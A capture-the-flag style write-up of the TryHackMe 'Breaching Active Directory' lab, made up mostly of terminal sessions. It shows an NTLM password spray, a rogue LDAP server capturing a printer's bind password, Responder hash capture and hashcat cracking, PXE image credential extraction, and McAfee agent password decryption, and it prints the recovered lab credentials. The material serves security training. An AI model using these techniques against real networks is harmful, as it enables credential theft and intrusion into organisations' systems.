---
title: "THM - Breaching Active Directory"
classes: wide
header:
  teaser: /assets/images/thm/thm.png
ribbon: cyan-blue
description: "Writeup for THM - # Breaching Active Directory"
categories:
  - THM
---

The given box ```Breaching Active Directory``` is a AD machine 

- [TryHackMe- Breaching Active Directory](#tryhackme---#Breaching-Active-Directory)
  - [NTLM Authenticated Services](#ntlm-authenticated-services)
  - [LDAP Bind Credentials](#ldap-bind-credentials)
  - [Authentication Relays](#authentication-relays)
  - [Microsoft Deployment Toolkit](#microsoft-deployment-toolkit)
  - [Configuration Files](#configuration-files)


<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/breachingad.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/network-diagram.png" />
</center>


```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# sudo systemctl restart NetworkManager

root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# nslookup thmdc.za.tryhackme.com
Server:         10.200.24.101
Address:        10.200.24.101#53

Name:   thmdc.za.tryhackme.com
Address: 10.200.24.101
```

## NTLM Authenticated Services

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/ | tee ntlm_passwordspray.txt
[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: samantha.thompson
[-] Failed login with Username: dawn.turner
[-] Failed login with Username: frances.chapman
[-] Failed login with Username: henry.taylor
[-] Failed login with Username: jennifer.wood
[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[-] Failed login with Username: louise.talbot
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[-] Failed login with Username: dominic.elliott
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
[-] Failed login with Username: alan.jones
[-] Failed login with Username: frank.fletcher
[-] Failed login with Username: maria.sheppard
[-] Failed login with Username: sophie.blackburn
[-] Failed login with Username: dawn.hughes
[-] Failed login with Username: henry.black
[-] Failed login with Username: joanne.davies
[-] Failed login with Username: mark.oconnor
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
[*] Password spray attack completed, 4 valid credential pairs found
```

Login with the valid credentials found from the above result http://ntlmauth.za.tryhackme.com/

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/ntlmauth_web.png" />
</center>

## LDAP Bind Credentials

http://printer.za.tryhackme.com/settings

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/printer_web.png" />
</center>


```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# rlwrap nc -lvp 389
listening on [any] 389 ...
10.200.24.201: inverse host lookup failed: Unknown host
connect to [10.50.22.47] from (UNKNOWN) [10.200.24.201] 61602
0Dc;

x
x
 objectclass0supportedCapabilities
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# sudo dpkg-reconfigure -p low slapd
  Backing up /etc/ldap/slapd.d in /var/backups/slapd-2.5.12+dfsg-2... done.
  Moving old database directory to /var/backups:
  - directory unknown... done.
  Creating initial configuration... done.
  Creating LDAP directory... done.
```


<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/config1.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/config2.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/config3.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/config4.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/config5.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/config6.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/config7.png" />
</center>


```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# cat olcSaslSecProps.ldif
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred 
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"


root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# sudo tcpdump -SX -i tun0 tcp port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
22:01:05.157098 IP 10.200.24.201.51806 > 10.50.22.47.ldap: Flags [SEW], seq 4061277580, win 64240, options [mss 1286,nop,wscale 8,nop,nop,sackOK], length 0
        0x0000:  4502 0034 3d16 4000 7f06 7aba 0ac8 18c9  E..4=.@...z.....
        0x0010:  0a32 162f ca5e 0185 f212 2d8c 0000 0000  .2./.^....-.....
        0x0020:  80c2 faf0 4499 0000 0204 0506 0103 0308  ....D...........
        0x0030:  0101 0402                                ....
22:01:05.157153 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [S.], seq 1839793710, ack 4061277581, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
        0x0000:  4500 0034 0000 4000 4006 f6d2 0a32 162f  E..4..@.@....2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 062e f212 2d8d  .......^m.....-.
        0x0020:  8012 faf0 d0c3 0000 0204 05b4 0101 0402  ................
        0x0030:  0103 0307                                ....
22:01:05.323596 IP 10.200.24.201.51806 > 10.50.22.47.ldap: Flags [.], ack 1839793711, win 1024, length 0
        0x0000:  4500 0028 3d18 4000 7f06 7ac6 0ac8 18c9  E..(=.@...z.....
        0x0010:  0a32 162f ca5e 0185 f212 2d8d 6da9 062f  .2./.^....-.m../
        0x0020:  5010 0400 0887 0000                      P.......
22:01:05.323642 IP 10.200.24.201.51806 > 10.50.22.47.ldap: Flags [P.], seq 4061277581:4061277655, ack 1839793711, win 1024, length 74
        0x0000:  4500 0072 3d19 4000 7f06 7a7b 0ac8 18c9  E..r=.@...z{....
        0x0010:  0a32 162f ca5e 0185 f212 2d8d 6da9 062f  .2./.^....-.m../
        0x0020:  5018 0400 a0f9 0000 3084 0000 0044 0201  P.......0....D..
        0x0030:  2763 8400 0000 3b04 000a 0100 0a01 0002  'c....;.........
        0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
        0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
        0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
        0x0070:  6573                                     es
22:01:05.323655 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [.], ack 4061277655, win 502, length 0
        0x0000:  4500 0028 fb5d 4000 4006 fb80 0a32 162f  E..(.]@.@....2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 062f f212 2dd7  .......^m../..-.
        0x0020:  5010 01f6 0a47 0000                      P....G..
22:01:05.323996 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [P.], seq 1839793711:1839793722, ack 4061277655, win 502, length 11
        0x0000:  4500 0033 fb5e 4000 4006 fb74 0a32 162f  E..3.^@.@..t.2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 062f f212 2dd7  .......^m../..-.
        0x0020:  5018 01f6 ac91 0000 3009 0201 2764 0404  P.......0...'d..
        0x0030:  0030 00                                  .0.
22:01:05.324023 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [P.], seq 1839793722:1839793736, ack 4061277655, win 502, length 14
        0x0000:  4500 0036 fb5f 4000 4006 fb70 0a32 162f  E..6._@.@..p.2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 063a f212 2dd7  .......^m..:..-.
        0x0020:  5018 01f6 a0a9 0000 300c 0201 2765 070a  P.......0...'e..
        0x0030:  0100 0400 0400                           ......
22:01:05.494377 IP 10.200.24.201.51806 > 10.50.22.47.ldap: Flags [.], ack 1839793736, win 1024, length 0
        0x0000:  4500 0028 3d1a 4000 7f06 7ac4 0ac8 18c9  E..(=.@...z.....
        0x0010:  0a32 162f ca5e 0185 f212 2dd7 6da9 0648  .2./.^....-.m..H
        0x0020:  5010 0400 0824 0000                      P....$..
22:01:05.494397 IP 10.200.24.201.51806 > 10.50.22.47.ldap: Flags [P.], seq 4061277655:4061277731, ack 1839793736, win 1024, length 76
        0x0000:  4500 0074 3d1b 4000 7f06 7a77 0ac8 18c9  E..t=.@...zw....
        0x0010:  0a32 162f ca5e 0185 f212 2dd7 6da9 0648  .2./.^....-.m..H
        0x0020:  5018 0400 6654 0000 3084 0000 0046 0201  P...fT..0....F..
        0x0030:  2863 8400 0000 3d04 000a 0100 0a01 0002  (c....=.........
        0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
        0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup
        0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan
        0x0070:  6973 6d73                                isms
22:01:05.494406 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [.], ack 4061277731, win 502, length 0
        0x0000:  4500 0028 fb60 4000 4006 fb7d 0a32 162f  E..(.`@.@..}.2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 0648 f212 2e23  .......^m..H...#
        0x0020:  5010 01f6 09e2 0000                      P.......
22:01:05.494537 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [P.], seq 1839793736:1839793747, ack 4061277731, win 502, length 11
        0x0000:  4500 0033 fb61 4000 4006 fb71 0a32 162f  E..3.a@.@..q.2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 0648 f212 2e23  .......^m..H...#
        0x0020:  5018 01f6 ab2c 0000 3009 0201 2864 0404  P....,..0...(d..
        0x0030:  0030 00                                  .0.
22:01:05.494550 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [P.], seq 1839793747:1839793761, ack 4061277731, win 502, length 14
        0x0000:  4500 0036 fb62 4000 4006 fb6d 0a32 162f  E..6.b@.@..m.2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 0653 f212 2e23  .......^m..S...#
        0x0020:  5018 01f6 9f44 0000 300c 0201 2865 070a  P....D..0...(e..
        0x0030:  0100 0400 0400                           ......
22:01:05.661359 IP 10.200.24.201.51806 > 10.50.22.47.ldap: Flags [.], ack 1839793761, win 1024, length 0
        0x0000:  4500 0028 3d1c 4000 7f06 7ac2 0ac8 18c9  E..(=.@...z.....
        0x0010:  0a32 162f ca5e 0185 f212 2e23 6da9 0661  .2./.^.....#m..a
        0x0020:  5010 0400 07bf 0000                      P.......
22:01:05.661379 IP 10.200.24.201.51806 > 10.50.22.47.ldap: Flags [P.], seq 4061277731:4061277805, ack 1839793761, win 1024, length 74
        0x0000:  4500 0072 3d1d 4000 7f06 7a77 0ac8 18c9  E..r=.@...zw....
        0x0010:  0a32 162f ca5e 0185 f212 2e23 6da9 0661  .2./.^.....#m..a
        0x0020:  5018 0400 9e31 0000 3084 0000 0044 0201  P....1..0....D..
        0x0030:  2963 8400 0000 3b04 000a 0100 0a01 0002  )c....;.........
        0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object
        0x0050:  636c 6173 7330 8400 0000 1704 1573 7570  class0.......sup
        0x0060:  706f 7274 6564 4361 7061 6269 6c69 7469  portedCapabiliti
        0x0070:  6573                                     es
22:01:05.661389 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [.], ack 4061277805, win 502, length 0
        0x0000:  4500 0028 fb63 4000 4006 fb7a 0a32 162f  E..(.c@.@..z.2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 0661 f212 2e6d  .......^m..a...m
        0x0020:  5010 01f6 097f 0000                      P.......
22:01:05.661535 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [P.], seq 1839793761:1839793772, ack 4061277805, win 502, length 11
        0x0000:  4500 0033 fb64 4000 4006 fb6e 0a32 162f  E..3.d@.@..n.2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 0661 f212 2e6d  .......^m..a...m
        0x0020:  5018 01f6 a9c9 0000 3009 0201 2964 0404  P.......0...)d..
        0x0030:  0030 00                                  .0.
22:01:05.661550 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [P.], seq 1839793772:1839793786, ack 4061277805, win 502, length 14
        0x0000:  4500 0036 fb65 4000 4006 fb6a 0a32 162f  E..6.e@.@..j.2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 066c f212 2e6d  .......^m..l...m
        0x0020:  5018 01f6 9de1 0000 300c 0201 2965 070a  P.......0...)e..
        0x0030:  0100 0400 0400                           ......
22:01:05.828372 IP 10.200.24.201.51806 > 10.50.22.47.ldap: Flags [.], ack 1839793786, win 1024, length 0
        0x0000:  4500 0028 3d1e 4000 7f06 7ac0 0ac8 18c9  E..(=.@...z.....
        0x0010:  0a32 162f ca5e 0185 f212 2e6d 6da9 067a  .2./.^.....mm..z
        0x0020:  5010 0400 075c 0000                      P....\..
22:01:05.828423 IP 10.200.24.201.51806 > 10.50.22.47.ldap: Flags [P.], seq 4061277805:4061277871, ack 1839793786, win 1024, length 66
        0x0000:  4500 006a 3d1f 4000 7f06 7a7d 0ac8 18c9  E..j=.@...z}....
        0x0010:  0a32 162f ca5e 0185 f212 2e6d 6da9 067a  .2./.^.....mm..z
        0x0020:  5018 0400 0caf 0000 3084 0000 003c 0201  P.......0....<..
        0x0030:  2a60 8400 0000 3302 0103 0404 4e54 4c4d  *`....3.....NTLM
        0x0040:  8a28 4e54 4c4d 5353 5000 0100 0000 0782  .(NTLMSSP.......
        0x0050:  08a2 0000 0000 0000 0000 0000 0000 0000  ................
        0x0060:  0000 0a00 6345 0000 000f                 ....cE....
22:01:05.828448 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [.], ack 4061277871, win 502, length 0
        0x0000:  4500 0028 fb66 4000 4006 fb77 0a32 162f  E..(.f@.@..w.2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 067a f212 2eaf  .......^m..z....
        0x0020:  5010 01f6 0924 0000                      P....$..
22:01:05.828804 IP 10.50.22.47.ldap > 10.200.24.201.51806: Flags [P.], seq 1839793786:1839793810, ack 4061277871, win 502, length 24
        0x0000:  4500 0040 fb67 4000 4006 fb5e 0a32 162f  E..@.g@.@..^.2./
        0x0010:  0ac8 18c9 0185 ca5e 6da9 067a f212 2eaf  .......^m..z....
        0x0020:  5018 01f6 9dad 0000 3016 0201 2a61 110a  P.......0...*a..
        0x0030:  0122 0400 040a 696e 7661 6c69 6420 444e  ."....invalid.DN
22:01:05.997384 IP 10.200.24.201.51807 > 10.50.22.47.ldap: Flags [SEW], seq 3373879185, win 64240, options [mss 1286,nop,wscale 8,nop,nop,sackOK], length 0
        0x0000:  4502 0034 3d20 4000 7f06 7ab0 0ac8 18c9  E..4=.@...z.....
        0x0010:  0a32 162f ca5f 0185 c919 4f91 0000 0000  .2./._....O.....
        0x0020:  80c2 faf0 4b8c 0000 0204 0506 0103 0308  ....K...........
        0x0030:  0101 0402                                ....
22:01:05.997542 IP 10.50.22.47.ldap > 10.200.24.201.51807: Flags [S.], seq 1498686057, ack 3373879186, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
        0x0000:  4500 0034 0000 4000 4006 f6d2 0a32 162f  E..4..@.@....2./
        0x0010:  0ac8 18c9 0185 ca5f 5954 2269 c919 4f92  ......._YT"i..O.
        0x0020:  8012 faf0 cfd0 0000 0204 05b4 0101 0402  ................
        0x0030:  0103 0307                                ....
22:01:06.051892 IP 10.200.24.201.51806 > 10.50.22.47.ldap: Flags [.], ack 1839793810, win 1024, length 0
        0x0000:  4500 0028 3d21 4000 7f06 7abd 0ac8 18c9  E..(=!@...z.....
        0x0010:  0a32 162f ca5e 0185 f212 2eaf 6da9 0692  .2./.^......m...
        0x0020:  5010 0400 0702 0000                      P.......
22:01:06.164556 IP 10.200.24.201.51807 > 10.50.22.47.ldap: Flags [.], ack 1498686058, win 1024, length 0
        0x0000:  4500 0028 3d22 4000 7f06 7abc 0ac8 18c9  E..(="@...z.....
        0x0010:  0a32 162f ca5f 0185 c919 4f92 5954 226a  .2./._....O.YT"j
        0x0020:  5010 0400 0794 0000                      P.......
22:01:06.164648 IP 10.200.24.201.51807 > 10.50.22.47.ldap: Flags [P.], seq 3373879186:3373879251, ack 1498686058, win 1024, length 65
        0x0000:  4500 0069 3d23 4000 7f06 7a7a 0ac8 18c9  E..i=#@...zz....
        0x0010:  0a32 162f ca5f 0185 c919 4f92 5954 226a  .2./._....O.YT"j
        0x0020:  5018 0400 11ae 0000 3084 0000 003b 0201  P.......0....;..
        0x0030:  2b60 8400 0000 3202 0102 0418 7a61 2e74  +`....2.....za.t
        0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc
        0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..tryhackmel
        0x0060:  6461 7070 6173 7331 40                   dappass1@
22:01:06.164670 IP 10.50.22.47.ldap > 10.200.24.201.51807: Flags [.], ack 3373879251, win 502, length 0
        0x0000:  4500 0028 7250 4000 4006 848e 0a32 162f  E..(rP@.@....2./
        0x0010:  0ac8 18c9 0185 ca5f 5954 226a c919 4fd3  ......._YT"j..O.
        0x0020:  5010 01f6 095d 0000                      P....]..
22:01:06.165231 IP 10.50.22.47.ldap > 10.200.24.201.51807: Flags [P.], seq 1498686058:1498686082, ack 3373879251, win 502, length 24
        0x0000:  4500 0040 7251 4000 4006 8475 0a32 162f  E..@rQ@.@..u.2./
        0x0010:  0ac8 18c9 0185 ca5f 5954 226a c919 4fd3  ......._YT"j..O.
        0x0020:  5018 01f6 9ce6 0000 3016 0201 2b61 110a  P.......0...+a..
        0x0030:  0122 0400 040a 696e 7661 6c69 6420 444e  ."....invalid.DN
22:01:06.379982 IP 10.200.24.201.51807 > 10.50.22.47.ldap: Flags [.], ack 1498686082, win 1024, length 0
        0x0000:  4500 0028 3d26 4000 7f06 7ab8 0ac8 18c9  E..(=&@...z.....
        0x0010:  0a32 162f ca5f 0185 c919 4fd3 5954 2282  .2./._....O.YT".
        0x0020:  5010 0400 073b 0000                      P....;..
```

```svcLDAP account : tryhackmeldappass1@``` 

## Authentication Relays

```shell
root@rE3oN:/opt/tools/Responder# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.50.22.47]
    Responder IPv6             [fe80::fc9c:d44c:c191:7772]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-KQM4YMEYBLJ]
    Responder Domain Name      [YK20.LOCAL]
    Responder DCE-RPC Port     [45014]

[+] Listening for events...

/usr/share/responder/./Responder.py:366: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
  thread.setDaemon(True)
/usr/share/responder/./Responder.py:256: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
  server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
[!] Error starting TCP server on port 389, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : ::ffff:10.200.24.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:2226b503022dba47:95D74C447E39811AD0738CB9C32F2B69:01010000000000000078B194519DD8016CCAE211BC82F9B8000000000200080059004B003200300001001E00570049004E002D004B0051004D00340059004D004500590042004C004A0004003400570049004E002D004B0051004D00340059004D004500590042004C004A002E0059004B00320030002E004C004F00430041004C000300140059004B00320030002E004C004F00430041004C000500140059004B00320030002E004C004F00430041004C00070008000078B194519DD801060004000200000008003000300000000000000000000000002000003D3E694D6192BB830C4373926867890FD252FE56B605BFDC3ABAA0E7D75F850D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320032002E00340037000000000000000000
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# hashcat -m 5600 ntlmv2-ssp-hash.txt passwordlist.txt --force
hashcat (v6.2.5) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-0x000, 1439/2942 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: passwordlist.txt
* Passwords.: 513
* Bytes.....: 4010
* Keyspace..: 513
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.

SVCFILECOPY::ZA:2226b503022dba47:95d74c447e39811ad0738cb9c32f2b69:01010000000000000078b194519dd8016ccae211bc82f9b8000000000200080059004b003200300001001e00570049004e002d004b0051004d00340059004d004500590042004c004a0004003400570049004e002d004b0051004d00340059004d004500590042004c004a002e0059004b00320030002e004c004f00430041004c000300140059004b00320030002e004c004f00430041004c000500140059004b00320030002e004c004f00430041004c00070008000078b194519dd801060004000200000008003000300000000000000000000000002000003d3e694d6192bb830c4373926867890fd252fe56b605bfdc3abaa0e7d75f850d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00350030002e00320032002e00340037000000000000000000:FPassword1!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SVCFILECOPY::ZA:2226b503022dba47:95d74c447e39811ad0...000000
Time.Started.....: Thu Jul 21 22:44:14 2022, (0 secs)
Time.Estimated...: Thu Jul 21 22:44:14 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   163.7 kH/s (0.58ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 513/513 (100.00%)
Rejected.........: 0/513 (0.00%)
Restore.Point....: 0/513 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hockey

Started: Thu Jul 21 22:44:13 2022
Stopped: Thu Jul 21 22:44:16 2022
```

## Microsoft Deployment Toolkit

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/pxeboot_web.png" />
</center>


```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# ssh thm@THMJMP1.za.tryhackme.com
thm@thmjmp1.za.tryhackme.com's password:
Microsoft Windows [Version 10.0.17763.1098]

thm@THMJMP1 C:\Users\thm\Documents>mkdir recon

thm@THMJMP1 C:\Users\thm\Documents>cd recon

C:\powerpxe\PowerPXE.ps1
C:\powerpxe\README.md
        3 file(s) copied.

thm@THMJMP1 C:\Users\thm\Documents\recon>tftp -i 10.200.24.202 GET "\Tmp\x64{8DEFCB56-5A53-40DF-BA18-659087A502E1}.bcd" conf.bcd
Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s

thm@THMJMP1 C:\Users\thm\Documents\recon>dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9
 Directory of C:\Users\thm\Documents\recon

07/21/2022  06:29 PM    <DIR>          .
07/21/2022  06:29 PM    <DIR>          ..
07/21/2022  06:29 PM            12,288 conf.bcd
03/03/2022  09:54 PM             1,098 LICENSE
03/03/2022  09:54 PM            98,573 PowerPXE.ps1
03/03/2022  09:54 PM             2,144 README.md
               4 File(s)        114,103 bytes
               2 Dir(s)  50,768,535,552 bytes free
thm@THMJMP1 C:\Users\thm\Documents\recon>powershell -executionpolicy bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm\Documents\recon> Import-Module .\PowerPXE.ps1
PS C:\Users\thm\Documents\recon> $BCDFile = "conf.bcd"
>> Parse the BCD file: conf.bcd
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
PS C:\Users\thm\Documents\recon> tftp -i 10.200.24.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
Transfer successful: 341899611 bytes in 179 second(s), 1910053 bytes/s
>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@
```

## Configuration Files

```powershell
PS C:\Users\thm\Documents\recon> cd C:\ProgramData\McAfee\Agent\DB
PS C:\ProgramData\McAfee\Agent\DB> ls


    Directory: C:\ProgramData\McAfee\Agent\DB


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/5/2022   6:45 PM         120832 ma.db
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
thm@thmjmp1.za.tryhackme.com's password:
ma.db                                                                                                                                           100%  118KB 140.8KB/s   00:00
```

```shell
root@rE3oN:~/enum-more/obsidian_vault/thm/breachingad# sqlitebrowser ma.db
libGL error: pci id for fd 19: 1ab8:0010, driver (null)
pci id for fd 20: 1ab8:0010, driver (null)
failed to create compose table
```

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/agent_repos.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/table_view1.png" />
</center>

<center>
<img src = "https://github.com/enum-more/obsidian_vault/raw/main/thm/breachingad/assets/image/table_view2.png" />
</center>

Username: Password  ```svcAV: jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==```

```shell
thm@thm:~/root/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master$ python2 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q== 
Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q== 
Decrypted password : MyStrongPassword! 
```